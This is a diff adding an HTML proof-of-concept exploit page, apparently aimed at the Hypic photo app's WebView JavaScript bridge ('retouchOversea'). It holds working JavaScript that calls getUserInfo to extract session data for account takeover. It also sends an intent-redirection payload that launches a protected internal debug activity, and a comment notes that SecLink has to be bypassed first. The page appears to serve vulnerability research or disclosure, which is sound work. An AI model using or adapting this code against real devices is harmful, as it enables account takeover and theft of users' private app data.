@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypic WebActivity Exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: sans-serif; padding: 20px; } 
+        button { margin-bottom: 20px; padding: 15px; border: none; border-radius: 5px; color: white; font-weight: bold; width: 100%; }
+        #btn-exfil { background: #d32f2f; }
+        #btn-intent { background: #1976d2; }
+        
+        /* Custom Alert Box CSS */
+        #custom-alert {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.5); z-index: 9999; justify-content: center; align-items: center;
+        }
+        .alert-content {
+            background: white; padding: 20px; border-radius: 8px; width: 80%; 
+            max-width: 400px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); word-wrap: break-word;
+        }
+        .alert-content h3 { margin-top: 0; color: #333; }
+        .alert-content pre { background: #eee; padding: 10px; overflow-x: auto; max-height: 200px; }
+        .close-btn { background: #333; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <h2>1. Account Takeover (getUserInfo)</h2>
+    <button id="btn-exfil" onclick="exfiltrateData()">Steal Session Data</button>
+
+    <h2>2. Intent Redirection (openSchema)</h2>
+    <button id="btn-intent" onclick="triggerIntent()">Launch Protected Activity</button>
+
+    <!-- Custom Alert Modal -->
+    <div id="custom-alert">
+        <div class="alert-content">
+            <h3>SUCCESS: App Data Extracted</h3>
+            <pre id="output"></pre>
+            <button class="close-btn" onclick="document.getElementById('custom-alert').style.display='none'">Close</button>
+        </div>
+    </div>
+
+    <script>
+        // Custom function to show our HTML alert instead of the broken native alert()
+        function showCustomAlert(dataObj) {
+            const dataString = JSON.stringify(dataObj, null, 2);
+            document.getElementById("output").innerText = dataString;
+            document.getElementById("custom-alert").style.display = 'flex';
+        }
+
+        // The callback function the app will execute to deliver the stolen data
+        function handleUserInfoResponse(responseObj) {
+            showCustomAlert(responseObj);
+        }
+
+        function exfiltrateData() {
+            if (window.retouchOversea) {
+                const payload = {
+                    func: "getUserInfo",
+                    data: {}, 
+                    cb: "handleUserInfoResponse" // Matches the JS function above
+                };
+                window.retouchOversea.postMessage(JSON.stringify(payload));
+            } else {
+                showCustomAlert({ "error": "retouchOversea JS object not found. Ensure you bypassed SecLink to load in the internal WebView." });
+            }
+        }
+
+        function triggerIntent() {
+            if (window.retouchOversea) {
+                // Targeting internal debugging component
+                const targetIntent = "intent:#Intent;component=com.xt.retouchoversea/com.xt.retouch.debug.DevModelActivity;end";
+                
+                const payload = {
+                    func: "openSchema",
+                    data: {
+                        "schema": targetIntent,
+                        "open_other_app": "1"
+                    },
+                    cb: "console.log"
+                };
+                window.retouchOversea.postMessage(JSON.stringify(payload));
+            } else {
+                showCustomAlert({ "error": "retouchOversea JS object not found." });
+            }
+        }
+    </script>
+</body>
+</html>
